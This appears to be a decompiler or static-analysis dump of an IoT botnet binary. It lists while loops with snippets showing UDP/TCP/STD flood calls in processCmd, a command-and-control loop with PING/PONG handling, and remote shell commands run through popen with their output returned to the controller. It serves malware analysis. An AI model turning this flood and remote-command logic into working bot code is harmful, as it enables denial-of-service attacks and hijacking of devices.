		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 25 @ processCmd ====================================
++++++++ WHILE START : 23632 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23641 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 26 @ processCmd ====================================
++++++++ WHILE START : 23663 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23672 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 27 @ processCmd ====================================
++++++++ WHILE START : 23734 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23743 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 28 @ processCmd ====================================
++++++++ WHILE START : 23775 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23784 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 29 @ processCmd ====================================
++++++++ WHILE START : 23812 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23821 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 31 @ processCmd ====================================
++++++++ WHILE START : 23933 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23942 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 32 @ processCmd ====================================
++++++++ WHILE START : 23970 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23979 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 34 @ processCmd ====================================
++++++++ WHILE START : 24015 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24031 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v467, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 35 @ processCmd ====================================
++++++++ WHILE START : 24072 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24088 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v468, v446, v447);
=============================WHILE LOOPS ID : 36 @ processCmd ====================================
++++++++ WHILE START : 24115 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24124 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 37 @ processCmd ====================================
++++++++ WHILE START : 24144 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24173 
++++++++ INTRESTING INSTRUCTIONS :  
		kill();
=============================WHILE LOOPS ID : 38 @ processCmd ====================================
++++++++ WHILE START : 24232 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24241 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 39 @ processCmd ====================================
++++++++ WHILE START : 24274 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24283 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 40 @ processCmd ====================================
++++++++ WHILE START : 24311 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24320 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 42 @ processCmd ====================================
++++++++ WHILE START : 24427 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24436 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 43 @ processCmd ====================================
++++++++ WHILE START : 24458 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24467 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 44 @ processCmd ====================================
++++++++ WHILE START : 24530 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24539 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 45 @ processCmd ====================================
++++++++ WHILE START : 24561 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24570 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 46 @ processCmd ====================================
++++++++ WHILE START : 24653 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24662 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 47 @ processCmd ====================================
++++++++ WHILE START : 24694 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24703 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 48 @ processCmd ====================================
++++++++ WHILE START : 24731 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24740 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 50 @ processCmd ====================================
++++++++ WHILE START : 24802 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24811 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 24843 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24852 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 52 @ processCmd ====================================
++++++++ WHILE START : 24879 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24888 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 54 @ processCmd ====================================
++++++++ WHILE START : 24956 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 24965 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 55 @ processCmd ====================================
++++++++ WHILE START : 24998 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25007 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 56 @ processCmd ====================================
++++++++ WHILE START : 25034 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25043 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 58 @ processCmd ====================================
++++++++ WHILE START : 25185 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25194 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 59 @ processCmd ====================================
++++++++ WHILE START : 25214 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25223 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 60 @ processCmd ====================================
++++++++ WHILE START : 25285 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25294 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 61 @ processCmd ====================================
++++++++ WHILE START : 25314 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25323 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 62 @ processCmd ====================================
++++++++ WHILE START : 25418 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25427 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 63 @ processCmd ====================================
++++++++ WHILE START : 25459 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25468 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 64 @ processCmd ====================================
++++++++ WHILE START : 25495 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25504 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 66 @ processCmd ====================================
++++++++ WHILE START : 25557 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25566 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 67 @ processCmd ====================================
++++++++ WHILE START : 25598 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25607 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 68 @ processCmd ====================================
++++++++ WHILE START : 25634 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25643 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 70 @ processCmd ====================================
++++++++ WHILE START : 25711 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25720 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 71 @ processCmd ====================================
++++++++ WHILE START : 25753 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25762 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 25789 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25798 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 25907 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25916 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 75 @ processCmd ====================================
++++++++ WHILE START : 25936 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 25945 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 26007 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26016 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 26036 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26045 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendUDP(v452, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 26140 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26149 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 26181 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26190 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 26217 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26226 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 26279 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26288 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 26320 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26329 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 26356 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26365 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 26433 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26442 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v458, v404, v440, v441, v442, 0, 10);
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 26473 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 26482 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v460, v446, v447);
=============================WHILE LOOPS ID : 89 @ getOurIP ====================================
++++++++ WHILE START : 27358 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 27379 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strstr(v398, "\t00000000\t") != 0) {
		if (fdgets(v398, 0x1000, v396) == 0) {
=============================WHILE LOOPS ID : 90 @ main ====================================
++++++++ WHILE START : 28238 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 28530 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() != 0) {
		__GI_inet_ntoa(*(int32_t *)&v404);
		getBuild();
		Rootsprintf(*(int32_t *)&v406, (int32_t)&v405);
		while (true) {
		while (true) {
		while (true) {
		if (strstr(v399, "PING") == v399) {
		Rootsprintf(*(int32_t *)&v406, (int32_t)"PONG");
		if (strstr(v399, "LELIMDUP") == v399) {
		zprintf((int32_t)"PEACE OUT IMMA DUP\n");
		while (true) {
		while (true) {
		while (true) {
		if (listFork() == 0) {
		szprintf(v400, (int32_t)"%s 2>&1", v430);
		fdpopen(v400, "r");
		Rootsprintf(*(int32_t *)&v406, (int32_t)"%s");
		while (fdgets(v400, 1024, v400) != 0) {
		Rootsprintf(*(int32_t *)&v406, (int32_t)"%s");
		fdpclose(v400);
		while (true) {
		processCmd(v435, &v394);
		free();
		free();
=============================WHILE LOOPS ID : 91 @ main ====================================
++++++++ WHILE START : 28548 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 28554 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 92 @ main ====================================
++++++++ WHILE START : 28589 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 28606 
++++++++ INTRESTING INSTRUCTIONS :  
		fgets((int32_t)&v393, 1024, v403);
		int32_t v453 = strcasecmp((char *)&v393, v449); // 0x4098d0
=============================WHILE LOOPS ID : 93 @ main ====================================
++++++++ WHILE START : 28658 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 28664 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 94 @ main ====================================
++++++++ WHILE START : 28682 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 28688 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 95 @ main ====================================
++++++++ WHILE START : 28715 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 28721 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 96 @ main ====================================
++++++++ WHILE START : 28739 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 28745 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 101 @ _vfprintf_internal ====================================
++++++++ WHILE START : 45961 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 53545 
++++++++ INTRESTING INSTRUCTIONS :  
		case 37: {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		case 0: {
		while (true) {
=============================WHILE LOOPS ID : 102 @ _vfprintf_internal ====================================
++++++++ WHILE START : 53552 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 54048 
++++++++ INTRESTING INSTRUCTIONS :  
		case 37: {
		while (true) {
		case 0: {
		while (true) {
=============================WHILE LOOPS ID : 107 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 56291 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 57104 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 108 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 58760 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 58794 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 110 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 59694 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 59743 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v397 = 0x1000000 * getc_unlocked();
=============================WHILE LOOPS ID : 119 @ strnlen ====================================
++++++++ WHILE START : 64470 
++++++++ WHILE FUNCTION : strnlen 
++++++++ WHILE END : 64562 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 121 @ strstr ====================================
++++++++ WHILE START : 64992 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 65087 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 122 @ __xpg_strerror_r ====================================
++++++++ WHILE START : 65882 
++++++++ WHILE FUNCTION : __xpg_strerror_r 
++++++++ WHILE END : 65959 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 128 @ srandom_r ====================================
++++++++ WHILE START : 85569 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 85604 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)(8 * v402), v398);
		__GI_random_r((int32_t *)a2, (int32_t)&v404);
=============================WHILE LOOPS ID : 135 @ _fpmaxtostr ====================================
++++++++ WHILE START : 102107 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 102981 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 141 @ memrchr ====================================
++++++++ WHILE START : 105575 
++++++++ WHILE FUNCTION : memrchr 
++++++++ WHILE END : 105664 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 142 @ __GI_strpbrk ====================================
++++++++ WHILE START : 106487 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 106530 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 143 @ inet_aton ====================================
++++++++ WHILE START : 106935 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 107009 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 144 @ __dns_lookup ====================================
++++++++ WHILE START : 107460 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 107905 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_pton(10, (char *)v415, (int32_t)&v414) < 1) {
		inet_addr(v415);
		int32_t v416 = socket(); // 0x412e08
		if (__libc_connect(v416, (struct sockaddr *)28, 28) > -1) {
		__libc_send(v416, (int32_t *)v383, 0, 0);
		int32_t v422 = __libc_recv(v416, (int32_t *)v383, 512, 0); // 0x412edc
		case 3: {
		case 0: {
		while (true) {
		while (true) {
		free();
		free();
		free();
		free();
		case 28: {
		case 1: {
		__libc_close(v390);
		free();
		free();
		__libc_close(v390);
		free();
		free();
=============================WHILE LOOPS ID : 145 @ __open_nameservers ====================================
++++++++ WHILE START : 108350 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 108379 
++++++++ INTRESTING INSTRUCTIONS :  
		fclose((int16_t *)v393);
=============================WHILE LOOPS ID : 146 @ __open_nameservers ====================================
++++++++ WHILE START : 108391 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 108518 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 149 @ __GI_strncat ====================================
++++++++ WHILE START : 115084 
++++++++ WHILE FUNCTION : __GI_strncat 
++++++++ WHILE END : 115147 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 157 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 118041 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 118294 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 160 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 121291 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 121517 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		if (inet_pton(2, (char *)v424, 0) > 0) {
		while (true) {
		fclose((int16_t *)a1);
=============================WHILE LOOPS ID : 163 @ __length_dotted ====================================
++++++++ WHILE START : 124097 
++++++++ WHILE FUNCTION : __length_dotted 
++++++++ WHILE END : 124127 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
